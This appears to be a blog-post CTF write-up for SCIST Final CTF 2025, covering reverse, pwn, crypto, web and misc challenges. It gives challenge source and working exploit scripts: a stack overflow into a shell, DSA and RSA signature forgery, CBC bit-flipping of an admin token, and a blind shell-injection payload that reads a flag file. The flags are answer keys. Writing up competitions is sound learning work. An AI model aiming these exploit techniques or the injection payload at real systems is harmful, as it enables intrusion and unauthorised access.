@@ -1,0 +1,1047 @@
+---
+title: 'SCIST Final CTF 2025 writeup'
+description: ''
+pubDate: 2025-07-25
+cover: './assets/cover.png'
+tags: ['CTF']
+draft: false
+pinned: true
+recommend: true
+---
+
+![image](https://hackmd.io/_uploads/rJS3NjeDll.png)
+
+## Reverse
+
+### Checker101
+
+Author: CX330
+
+首先用`r2`分析一下，發現有`dbg.chal.main`這個函數<br />
+跳過去並且 disassemble function後<br />
+發現他呼叫了`dbg.chal.getFlag`<br />
+然後發現這個<br />
+`TDNTS|Mrt0X3X2njw64XA63>Xdo4dl4uX2o7rkcXe4X3Xwn4dbX7aXd3l4&z`<br />
+看起來很像flag的東西<br />
+他把每個字元跟`0x07`做xor<br />
+所以寫個python就可以get flag<br />
+
+```python
+enc = "TDNTS|Mrt0X3X2njw64XA63>Xdo4dl4uX2o7rkcXe4X3Xwn4dbX7aXd3l4&z"
+key = 0x07
+flag = ''.join(chr(ord(c) ^ key) for c in enc)
+print(flag)
+```
+
+Flag: `SCIST{Jus7_4_5imp13_F149_ch3ck3r_5h0uld_b3_4_pi3ce_0f_c4k3!}`
+
+---
+
+### Duel [First Blood🩸]
+
+Author: CX330
+
+~~先通靈出有第七個選項~~<br />
+然後出現`Start!`後不到一秒就Game over了<br />
+![image](https://hackmd.io/_uploads/SyYvTtePlg.png)
+
+#### Exploit Code
+
+```python
+from pwn import *
+
+r = remote('lab.scist.org', 31605)
+#r = process("./Duel")
+
+r.sendline(b"7")
+
+r.recvuntil(b"Start!\n")
+
+r.sendline(b' ')
+
+result = r.recvall().decode()
+print(result)
+```
+
+![image](https://hackmd.io/_uploads/B1GjCtlDgx.png)
+Flag: `SCIST{H4ha_ch0051ng_4_900d_w3ap0n_15_much_m0r3_imp07ant}`
+
+---
+
+### Neko Identification System
+
+Author: Dr.dog
+
+給了一個html，用vscode打開後~~電腦就快掛了~~<br />
+發現了超級長的code<br />
+
+```javascript
+;(function (H, L) {
+  const J = i,
+    m = H()
+  while (!![]) {
+    try {
+      const I =
+        (parseInt(J(0x18f)) / 0x1) * (-parseInt(J(0x19a)) / 0x2) +
+        (parseInt(J(0x193)) / 0x3) * (-parseInt(J(0x19d)) / 0x4) +
+        -parseInt(J(0x196)) / 0x5 +
+        -parseInt(J(0x18d)) / 0x6 +
+        -parseInt(J(0x19e)) / 0x7 +
+        -parseInt(J(0x1a1)) / 0x8 +
+        parseInt(J(0x1aa)) / 0x9
+      if (I === L) break
+      else m['push'](m['shift']())
+    } catch (Y) {
+      m['push'](m['shift']())
+    }
+  }
+})(G, 0x1b3f0)
+const a = [0x54, 0x61, 0x6d, 0x61, 0x6b, 0x69, 0x20, 0x4b, 0x6f, 0x74, 0x61, 0x74, 0x73, 0x75],
+  b = [0xdd, 0x31, 0x23, 0x26, 0x66, 0x63, ...略]
+
+function G() {
+  const X = [
+    'arrayBuffer',
+    'wKBck',
+    'color',
+    '4LAkRdM',
+    'length',
+    'imageInput',
+    '116ehsHeu',
+    '1127161FMAmaN',
+    'ofbaM',
+    'result',
+    '603712xoHuuw',
+    'not a neko',
+    'Please\x20upload\x20a\x20file',
+    'green',
+    'Image\x20too\x20small',
+    'WnaiF',
+    'hMsIh',
+    'textContent',
+    'getElementById',
+    '5763465oMPzgo',
+    'VeiKn',
+    '724992NJWWXa',
+    'Nyan!',
+    '39315PgXeea',
+    'red',
+    'files',
+    'YfLQx',
+    '1206gaSnBI',
+    'CqRYM',
+    'KmABs',
+    '405890uCeNbt',
+  ]
+  G = function () {
+    return X
+  }
+  return G()
+}
+
+function i(H, L) {
+  const m = G()
+  return (
+    (i = function (I, Y) {
+      I = I - 0x18c
+      let d = m[I]
+      return d
+    }),
+    i(H, L)
+  )
+}
+async function checkImage() {
+  const R = i,
+    H = {
+      wKBck: R(0x19c),
+      KmABs: function (Y, d, Z) {
+        return Y(d, Z)
+      },
+      VeiKn: R(0x190),
+      hMsIh: function (Y, d) {
+        return Y < d
+      },
+      CqRYM: function (Y, d, Z) {
+        return Y(d, Z)
+      },
+      WnaiF: R(0x18e),
+      YfLQx: R(0x1a4),
+      ofbaM: R(0x1a2),
+    },
+    L = document[R(0x1a9)](H[R(0x198)])[R(0x191)][0x0]
+  if (!L) return void H[R(0x195)](showResult, R(0x1a3), H[R(0x18c)])
+  const m = await L[R(0x197)](),
+    I = new Uint8Array(m)
+  if (H[R(0x1a7)](I[R(0x19b)], b['length'])) return void showResult(R(0x1a5), H[R(0x18c)])
+  b['every']((Y, d) => (I[d] ^ a[d % a[R(0x19b)]]) === Y)
+    ? H[R(0x194)](showResult, H[R(0x1a6)], H[R(0x192)])
+    : H[R(0x195)](showResult, H[R(0x19f)], H[R(0x18c)])
+}
+
+function showResult(H, L) {
+  const t = i,
+    m = document[t(0x1a9)](t(0x1a0))
+  ;(m[t(0x1a8)] = H), (m['style'][t(0x199)] = L)
+}
+```
+
+#### Solve.js
+
+```javascript
+const a = [0x54,0x61,0x6d,0x61,0x6b,0x69,0x20,0x4b,0x6f,0x74,0x61,0x74,0x73,0x75];
+const b = [0xdd,0x31,0x23,0x26,0x66,0x63,0x3a,0x41,....略];
+const originalBytes = b.map((byte, index) => byte ^ a[index % a.length]);
+const fs = require('fs');
+fs.writeFileSync('output.png', Buffer.from(originalBytes));
+```
+
+#### output.png
+
+![output](https://hackmd.io/_uploads/SkkxS9ePge.png)
+Flag: `SCIST{NekoNekoNyanNyan}`
+
+---
+
+## Pwn
+
+### Checkin
+
+Author: pwn2ooown
+
+#### chal.c
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+void welcome_to_SCIST_2025_final(){
+    system("/bin/sh");
+}
+int main(){
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("Ready to pwn?");
+    char buf[32];
+    gets(buf);
+    return 0;
+}
+```
+
+利用 `gets()` 造成的 stack buffer overflow 覆蓋 return address，跳轉執行 `system("/bin/sh")` 拿到 shell。
+
+```lua=
++------------------------------------------+
+|                  "A" * 32                | ← buf[32]
++------------------------------------------+
+|              saved RBP (8 bytes)         |
++------------------------------------------+
+|         0x0040101a (ret gadget)          | ← return address 被覆蓋
++------------------------------------------+
+| 0x00401955 (welcome_to_SCIST_2025_final) |
++------------------------------------------+
+```
+
+#### Exploit Code
+
+```python
+from pwn import *
+
+# r = process('./chal')
+r = remote('lab.scist.org', 31606)
+
+r.recvline()
+payload = b'A' * 40
+payload += p64(0x0040101a)
+payload += p64(0x00401955)
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+Flag: `SCIST{welcome_to_SCIST_Final_Pwn_GLHF!!!_db97450f5b12a4fa7d884ae1b8f94216}`
+
+---
+
+## Crypto
+
+### owo
+
+Author: Dr.dog
+
+#### chal.py
+
+```python
+#!/bin/python3
+from Crypto.Util.number import *
+from secret import FLAG
+
+OwO, OWO, owo = sorted([getPrime(512) for _ in "awa"])
+
+Owo = bytes_to_long(FLAG)
+def OWo():
+    global Owo
+    Owo = (OwO * Owo % owo - OWO % owo) % owo
+    return Owo
+
+for _ in range(100):
+    OWo()
+
+def main():
+    for _ in range(10):
+        oWO = bytes.fromhex(input('> '))
+        oWO = bytes_to_long(oWO) ^ ((1 << 512) - 1)
+        oWo = long_to_bytes((oWO % owo) ^ (OWo() % owo)).hex()
+        print(f"oWo = {oWo}")
+
+if __name__ == '__main__':
+    main()
+```
+
+![fb031938-8e3e-4f73-b2fc-71a29e5f7cb8 (1)](https://hackmd.io/_uploads/HyeiRjcgvle.png)
+
+1. **收集 LCG 狀態**  
+   輸入固定值 10 次，從輸出中反推出：
+
+   $$
+   X_{101},\ X_{102},\ \dots,\ X_{110}
+   $$
+
+2. **求差分序列**
+
+   $$
+   d_i = X_{i+1} - X_i
+   $$
+
+3. **還原模數 $m$**  
+   根據 LCG 性質，有：
+
+   $$
+   d_{i+2}^2 - d_{i+1} \cdot d_{i+3} \equiv 0 \mod m
+   $$
+
+   將多組 $U_i = d_{i+2}^2 - d_{i+1} \cdot d_{i+3}$ 取 GCD 得：
+
+   $$
+   m = \gcd(U_1, U_2, \dots)
+   $$
+
+4. **還原乘數 $a$ 與減量 $c$**
+
+   $$
+   a = d_1 \cdot d_0^{-1} \mod m
+   $$
+
+   $$
+   c = (a \cdot X_0 - X_1) \mod m
+   $$
+
+5. **還原初始種子 $X_0$**
+
+   使用公式：
+
+   $$
+   X_n = (X_{n+1} + c) \cdot a^{-1} \mod m
+   $$
+
+   從 $X_{101}$ 往回推 101 次即可得到原始種子 $X_0$。
+
+#### Exploit Code
+
+```python
+#!/usr/bin/env python3
+from Crypto.Util.number import long_to_bytes
+import math
+
+s = [int(x, 16) for x in [
+    "44d98185474fdb15a91c787ffda5369b2420b341c4d3ae567b8446b8b4beb0c0a2c63866c3e979c57c9009f78ab42dd25a6f5cb48e9ccdf67af0f20acbf03d15",
+    "837616e44439754c7f6b13da71ef79c71d65b2054589320455624e06fa3bc5c8cb7a623d4f7482ecc13194c7122e9b174ad0ccfe1f7f39facefbce0e01d3284e",
+    "89ad1d4c6de898d5b2e551b57b6d9523449de3ae09ec2a2ea49a89f08bc3ee95596eeed69ee57b419a8560bbbb2c66796228312e4832693515875de246203000",
+    "24ea8a2798db501a975719c7927911a54f516d6480d544f1f3d7699160df30895dbf9ea7c8b5c9817f5292e327117228964c8fbf51b01d8d3c9ac3f1b2c6d6c9",
+    "02ce88872bdcf85dd497a8b8811fc4b084c4cdb3615df68f38e6767976ab7b30538ae15b5454272f9a37f2a5033a5e77c19f68125734d3e4fd784721124da128",
+    "15c12fd4b65ddb374a03fe88bee1b6e5fea9817523bc803bb35cfb0ac3ca163e1dac923d1a91339966a4d732f83c0102e3725724869ff876ad81de2adddef063",
+    "24ea3e6bf7adfcafec44c43ecc4c1960d826fdd4b889361d1853a986015d9948ac52233e0484c36e0f7c9c7ab4389b08f5515aa721c61cab6eddd445f0c7b0b1",
+    "bd082c922430506100383e6677f983da21a7545e8761b0e2759afe1aab8685972fd66e6e027f28f8695ae9a33acd37180bd99f582e2f747a403d1af0a9a4f9fb",
+    "359d6a376ef4134d1ab2635b7dac47d9a35ea3d01d90fcd3ff61ed61ae83ca25c3a8ef87408a9a58c7c0f313efe1b81fd9d84f644a839a8090ef42f6241dff41",
+    "caf0fedf58c0c6ed88734fbc2574d1c82c4909b50deb950dc41415988817f63aa5d454187ec1f9b07b5c37d903170e1bfac734e55acd97fb06925b49974d3e68",
+]]
+
+d = [s[i+1] - s[i] for i in range(len(s) - 1)]
+u = [d[i+1]**2 - d[i]*d[i+2] for i in range(len(d) - 2)]
+m = abs(math.gcd(*u))
+a = (d[1] * pow(d[0], -1, m)) % m
+c = (a * s[0] - s[1]) % m
+
+x = s[0]
+ainv = pow(a, -1, m)
+for _ in range(101):
+    x = ((x + c) * ainv) % m
+
+print(long_to_bytes(x).decode())
+```
+
+Flag: `SCIST{just_a_Linear_Congruential_Generator}`
+
+---
+
+### dsaaaaaaaaaaaaaaaaa
+
+Author: Dr.dog
+
+#### chal.py
+
+```python
+#!/bin/python3
+from hashlib import sha1
+from Crypto.Util.number import *
+from secret import FLAG
+from random import randint, getrandbits
+
+def gen_params():
+    while True:
+        q = getPrime(160)
+        if q % 6 == 1:
+            break
+
+    while True:
+        p = q * getrandbits(864) + 1
+        if isPrime(p):
+            break
+
+    while True:
+        R = [pow(randint(1, q - 1), (q - 1) // (3 - int(_)), q) for _ in "01"]
+        a, b = R[0], R[1]
+        if a != 1 and b != 1:
+            break
+
+    g = pow(2, (p - 1) // q, p)
+    x = randint(1, q - 1)
+    y = pow(g, x, p)
+    k = randint(1, q - 1)
+    return p, q, g, x, y, k, a, b
+
+p, q, g, x, y, k, a, b = gen_params()
+
+def H(m):
+    return bytes_to_long(sha1(m).digest())
+
+def sign(m, k, t):
+    k = ((k ^ pow(a, t, q)) * pow(b, t, q) )% q
+    r = pow(g, k, p) % q
+    s = (pow(k, -1, q) * (H(m) + x * r)) % q
+    return (r, s)
+
+def verify(m, r, s):
+    if not (0 < r < q and 0 < s < q):
+        return False
+    w = pow(s, -1, q)
+    u1 = H(m) * w % q
+    u2 = r * w % q
+    v = (pow(g, u1, p) * pow(y, u2, p) % p) % q
+    return v == r
+
+def example(t):
+    menu = '''[A]yachiNene
+[I]nabaMeguru
+[T]ogakushiTouko
+[S]hiibaTsumugi
+> '''
+
+    choice = input(menu).lower()
+
+    if choice == 'a':
+        msg = b'AyachiNene'
+    elif choice == 'i':
+        msg = b'InabaMeguru'
+    elif choice == 't':
+        msg = b'TogakushiTouko'
+    elif choice == 's':
+        msg = b'ShiibaTsumugi'
+    else:
+        print("Invalid choice.")
+        exit(0)
+
+
+    r, s = sign(msg, k, t)
+    assert verify(msg, r, s)
+    return r, s
+
+def main():
+    menu = '''[E]xample
+[G]et FLAG
+> '''
+    print(f"{p = }")
+    print(f"{q = }")
+    print(f"{g = }")
+    print(f"{y = }")
+
+    for i in range(10):
+        choice = input(menu).lower()
+        if choice == 'e':
+            r, s = example(i)
+            print(f"{r = }")
+            print(f"{s = }")
+        if choice == 'g':
+            r = int(input("r: "))
+            s = int(input("s: "))
+            if verify(b'GET_FLAG', r, s):
+                print(f"Here's your flag: {FLAG}")
+                exit(0)
+            else:
+                print("Invalid signature.")
+                exit(0)
+
+if __name__ == '__main__':
+    main()
+```
+
+#### 還原私鑰 $x$
+
+假設簽章對相同訊息 $m$，取：
+
+- 第 0 次簽章：$(r_0, s_0)$
+- 第 3 次簽章：$(r_3, s_3)$  
+  題目設計使得：$k_3 \equiv -k_0 \mod q$
+
+推導：
+
+$$
+s_0^{-1}(h + x r_0) + s_3^{-1}(h + x r_3) \equiv 0 \mod q
+$$
+
+整理得：
+
+$$
+x = \frac{ -h (s_0^{-1} + s_3^{-1}) }{ s_0^{-1} r_0 + s_3^{-1} r_3 } \mod q
+$$
+
+---
+
+#### 偽造簽章
+
+得出 $x$ 後，自行挑 $k$ 計算：
+
+$$
+r = (g^k \bmod p) \bmod q \\
+s = k^{-1}(H(m) + x r) \bmod q
+$$
+
+#### Exploit Code
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from hashlib import sha1
+from Crypto.Util.number import bytes_to_long, inverse
+from random import randint
+
+p = remote('lab.scist.org', 31612)
+
+def H(m):
+    return bytes_to_long(sha1(m).digest())
+
+def get_params():
+    P = int(p.recvline().split(b'=')[1])
+    Q = int(p.recvline().split(b'=')[1])
+    G = int(p.recvline().split(b'=')[1])
+    Y = int(p.recvline().split(b'=')[1])
+    p.recvuntil(b'> ')
+    return P, Q, G, Y
+
+def get_sig(c='a'):
+    p.sendline(b'e')
+    p.recvuntil(b'> ')
+    p.sendline(c.encode())
+    r = int(p.recvline().split(b'=')[1])
+    s = int(p.recvline().split(b'=')[1])
+    p.recvuntil(b'> ')
+    return r, s
+
+def recover_x(r0, s0, r3, s3, h, q):
+    a = inverse(s0, q)
+    b = inverse(s3, q)
+    num = (-h * (a + b)) % q
+    den = (a * r0 + b * r3) % q
+    return (num * inverse(den, q)) % q
+
+def forge(msg, p, q, g, x):
+    h = H(msg)
+    while True:
+        k = randint(1, q - 1)
+        r = pow(g, k, p) % q
+        if r == 0: continue
+        s = (inverse(k, q) * (h + x * r)) % q
+        if s == 0: continue
+        return r, s
+
+def main():
+    P, Q, G, Y = get_params()
+    M = b'AyachiNene'
+    h = H(M)
+    r0, s0 = get_sig()
+    get_sig(); get_sig()
+    r3, s3 = get_sig()
+    x = recover_x(r0, s0, r3, s3, h, Q)
+    r, s = forge(b'GET_FLAG', P, Q, G, x)
+    p.sendline(b'g')
+    p.recvuntil(b'r: ')
+    p.sendline(str(r).encode())
+    p.recvuntil(b's: ')
+    p.sendline(str(s).encode())
+    print(p.recvall().decode())
+
+if __name__ == '__main__':
+    main()
+```
+
+Flag: `SCIST{nonce_reuseeeeeeeeeeeeeeeeeeeee}`
+
+---
+
+### RSA SigSig
+
+Author: Dr.dog
+
+#### chal.py
+
+```python
+#!/bin/python3
+from Crypto.Util.number import *
+from random import getrandbits
+from secret import FLAG
+
+p, q = getPrime(512), getPrime(512)
+n = p * q
+
+def sign(skey, pkey, message):
+    message = bytes_to_long(message)
+    half = skey.bit_length() // 2
+    left_part = skey >> half
+    right_part = skey & ((1 << half) - 1)
+    exponent = left_part * right_part
+    return pow(message ^ pkey, exponent, n)
+
+def verify(pkey, signature, message):
+    message = bytes_to_long(message)
+    return pow(signature, pkey, n) ^ pkey == message
+
+def gen_keypair():
+    while True:
+        try:
+            skey = getrandbits(1024)
+            half = skey.bit_length() // 2
+            left_part = skey >> half
+            right_part = skey & ((1 << half) - 1)
+            exponent = left_part * right_part
+            pkey = pow(exponent, -1, (p - 1) * (q - 1))
+            break
+        except:
+            pass
+    return (skey, pkey)
+
+def get_example():
+    (skey, pkey) = gen_keypair()
+    signature = sign(skey, pkey, b'example_msg')
+    assert verify(pkey, signature, b'example_msg')
+    print(f"{pkey = }")
+    print(f"{skey = }")
+    print(f"{n = }")
+
+def get_flag():
+    pkey = getrandbits(64)
+    print(f"{pkey = }")
+    signature = int(input("signature : "))
+    if verify(pkey, signature, b'give_me_flag'):
+        print(f"[+] success")
+        print(f"here is your FLAG: {FLAG}")
+        exit(0)
+    else:
+        print(f"[+] failed")
+
+def main():
+    get_example()
+    for _ in range(100):
+        get_flag()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+#### 還原 $\varphi(n)$
+
+從程式中可得：
+
+- 私鑰 $skey$ 被拆成兩半做乘法：
+  $$
+  e = skey_L \cdot skey_R
+  $$
+- 題目中有：
+  $$
+  pkey \cdot e \equiv 1 \pmod{\varphi(n)} \Rightarrow pkey \cdot e - 1 = k \cdot \varphi(n)
+  $$
+
+令：
+
+$$
+m = pkey \cdot e - 1
+$$
+
+接著利用 $m$ 是 $\varphi(n)$ 的倍數這點，對 $n$ 做分解取得 $p$, $q$。
+
+---
+
+#### 偽造簽章
+
+簽章驗證公式為：
+
+$$
+(signature)^{pkey} \mod n \oplus pkey = message
+$$
+
+移項得：
+
+$$
+(signature)^{pkey} \mod n = message \oplus pkey
+$$
+
+令：
+
+$$
+target = message \oplus pkey
+$$
+
+因為已知 $\varphi(n)$，可以求 $pkey^{-1} \mod \varphi(n)$，設為 $d$，則：
+
+$$
+signature = target^d \mod n
+$$
+
+#### Exploit Code
+
+```python
+#!/usr/bin/python3
+from Crypto.Util.number import *
+from pwn import *
+import math
+
+def factor_n(pk, sk, n):
+    h = sk.bit_length() // 2
+    l, r = sk >> h, sk & ((1 << h) - 1)
+    e = l * r
+    m = pk * e - 1
+    t = m
+    while t % 2 == 0:
+        t //= 2
+    g = 2
+    while True:
+        y = pow(g, t, n)
+        if y == 1 or y == n - 1:
+            g += 1
+            continue
+        while True:
+            x = y
+            y = pow(x, 2, n)
+            if y == n - 1:
+                break
+            if y == 1:
+                p = math.gcd(x - 1, n)
+                q = n // p
+                return p, q
+        g += 1
+
+def forge(pk, n, phi):
+    m = bytes_to_long(b'give_me_flag')
+    t = m ^ pk
+    try:
+        d = pow(pk, -1, phi)
+    except:
+        return None
+    return pow(t, d, n)
+
+def main():
+    io = remote('lab.scist.org', 31613)
+    io.recvuntil(b'pkey = ')
+    pk0 = int(io.recvline())
+    io.recvuntil(b'skey = ')
+    sk = int(io.recvline())
+    io.recvuntil(b'n = ')
+    n = int(io.recvline())
+    p, q = factor_n(pk0, sk, n)
+    phi = (p - 1) * (q - 1)
+    for _ in range(100):
+        try:
+            io.recvuntil(b'pkey = ')
+            pk = int(io.recvline())
+            sig = forge(pk, n, phi)
+            if sig is None:
+                io.sendlineafter(b'signature : ', b'0')
+            else:
+                io.sendlineafter(b'signature : ', str(sig).encode())
+            out = io.recvall(timeout=1).decode()
+            if 'SCIST{' in out:
+                for line in out.split('\n'):
+                    if 'SCIST{' in line:
+                        print(line.strip())
+                break
+        except EOFError:
+            break
+    io.close()
+
+if __name__ == '__main__':
+    main()
+```
+
+Flag: `SCIST{get_phi_n_by_skey_and_pkey}`
+
+---
+
+### Yoshino's Secret Plus
+
+Author: Dr.dog
+
+#### chal.py
+
+```python
+#!/bin/python3
+import os
+import json
+import random
+from secret import FLAG
+from Crypto.Util.number import *
+from Crypto.Util.Padding import *
+from Crypto.Cipher import AES
+
+KEY = os.urandom(16)
+
+def encrypt(plaintext: bytes) -> bytes:
+    iv = plaintext[:16]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(pad(plaintext[16:], AES.block_size))
+
+def decrypt(ciphertext: bytes) -> str:
+    iv = ciphertext[:16]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
+    return plaintext
+
+def parse_token(token_hex: str) -> dict:
+    token_bytes = bytes.fromhex(token_hex)
+    decrypted = decrypt(token_bytes)
+    parts = decrypted.split(b'&')
+
+    assert len(parts) == 4
+
+    token_dict = {}
+    for part in parts:
+        key, value = part.split(b'=')
+        token_dict[key.decode()] = value
+
+    token_dict["OTP"] = int(token_dict["OTP"].decode())
+    token_dict["secret"] = bytes.fromhex(token_dict["secret"].decode())
+    token_dict["admin"] = int(token_dict["admin"].decode())
+    return token_dict
+
+def check(token, OTP, secret):
+    token_data = parse_token(token)
+    if token_data["admin"] and token_data["OTP"] == OTP and token_data["secret"] == secret:
+        print(f"Here is your flag: {FLAG}")
+        exit()
+    else:
+        print("Hi, {}".format(token_data["id"]))
+        print("You don't have permission to get FLAG")
+
+def main():
+    secret = os.urandom(8)
+    passkey = 'OTP={}&id={}&admin={}&secret={}'.format(12345678,"Tomotake_Yoshino_is_the_cutest<3",0,secret.hex())
+    token = encrypt(os.urandom(16) + passkey.encode())
+    print(f"token: {token.hex()}")
+    while True:
+        OTP = random.randint(0,99999999)
+        print(f"OTP: {OTP}")
+        token = input("token > ")
+        check(token, OTP, secret)
+
+if __name__ == '__main__':
+    main()
+```
+
+token 結構如下：
+
+$$
+\text{token} = \text{IV} \| C_1 \| C_2 \| C_3 \| \cdots
+$$
+
+明文格式如下：
+
+$$
+\text{plaintext} = \texttt{OTP=12345678\&id=...\&admin=0\&secret=...}
+$$
+
+CBC 解密邏輯：
+
+$$
+P_i = D_k(C_i) \oplus C_{i-1}
+$$
+
+因此修改 $C_{i-1}$ 可以控制 $P_i$，我們會利用這點達成位元翻轉。
+
+想將 `admin=0` 改為 `admin=1`，若該字串出現在第 $P_4$ 區塊，我們要改的是 $C_3$：
+
+$$
+C_3[7] \mathrel{{\oplus}=} \texttt{ord('0')} \oplus \texttt{ord('1')}
+$$
+
+伺服器會印出新的 OTP，例如 `OTP=87654321`，這在明文 $P_1$ 區塊，我們要從原始：
+
+$$
+\texttt{OTP=12345678}
+$$
+
+變為新的 OTP，則對應要修改 IV：
+
+$$
+\text{IV}[4 + i] \mathrel{{\oplus}=} \texttt{original\_otp[i]} \oplus \texttt{new\_otp[i]} \quad \text{for } i = 0 \ldots 7
+$$
+
+最後送出篡改後的 token：
+
+$$
+\text{token}_{\text{new}} = \text{IV}' \| C_1 \| C_2 \| C_3' \| C_4 \cdots
+$$
+
+#### Expliot Code
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+p = remote('lab.scist.org', 31609)
+
+def xor_bytes(a, b):
+    return bytes([x ^ y for x, y in zip(a, b)])
+
+def bit_flip():
+    p.recvuntil(b'token: ')
+    token = bytes.fromhex(p.recvline().strip().decode())
+
+    iv = token[0:16]
+    c1 = token[16:32]
+    c2 = token[32:48]
+    c3 = token[48:64]
+    rest = token[64:]
+
+    while True:
+        try:
+            p.recvuntil(b'OTP: ')
+            otp = p.recvline().strip().decode().zfill(8).encode()
+
+            c3_mod = bytearray(c3)
+            c3_mod[7] ^= ord('0') ^ ord('1')
+
+            iv_mod = bytearray(iv)
+            for i in range(8):
+                iv_mod[4 + i] ^= ord('12345678'[i]) ^ otp[i]
+
+            forged = bytes(iv_mod) + c1 + c2 + bytes(c3_mod) + rest
+            p.sendlineafter(b'token > ', forged.hex().encode())
+
+            res = p.recvall(timeout=1)
+            if b'SCIST{' in res:
+                print(res.decode())
+                break
+        except EOFError:
+            break
+
+if __name__ == '__main__':
+    bit_flip()
+```
+
+Flag: `SCIST{decrypt_and_encrypt_and_decrypt_and_encrypt_get_secret}`
+
+---
+
+## Web
+
+### dig-blind2
+
+Author: Vincent55
+
+#### Expliot Code
+
+```python
+import requests
+
+url = "http://lab.scist.org:31601/"
+prefix = "SCIST{"
+charset = "0123456789abcdefghijklmnopqrstuvwxyz_!}"
+flag = prefix
+
+while not flag.endswith("}"):
+    for char in charset:
+        payload = f"'; grep -q \"{flag + char}\" /fl* && exit 0 || exit 1'"
+        data = {'name': payload}
+
+        response = requests.post(url, data=data)
+
+        if response.text.count("success") == 2:
+            flag += char
+            print(f"Found: {flag}")
+            break
+
+print(f"Final Flag: {flag}")
+```
+
+![image](https://hackmd.io/_uploads/rkPPQoewee.png)
+挺酷ww
+
+Flag: `SCIST{use_timebase_to_leak_without_network}`
+
+---
+
+## Misc
+
+### MIT license
+
+Author: Vincent55
+
+#### Code
+
+```python
+#!/usr/local/bin/python3
+
+print(open(__file__).read())
+
+class MIT:
+    # private variable to prevent access!
+    __flag = ['/flag']
+
+    def run(self):
+        while True:
+            inp = input('Enter code: ')
+            if inp == 'license':
+                print(license())
+            elif inp == 'patch':
+                src = input('src: ')
+                dst = input('dst: ')
+                setattr(license, src, getattr(MIT, dst))
+            else:
+                print("bye~")
+                return
+
+
+exec('MIT().run()', {'__builtins__': {"MIT": MIT}}, {})
+```
+
+#### Solve
+
+```lua=
+      patch
+        ↓
+_Printer__filenames
+        ↓
+    _MIT__flag
+        ↓
+     license
+```
+
+Flag: `SCIST{MIT-license_can_readfile!}`
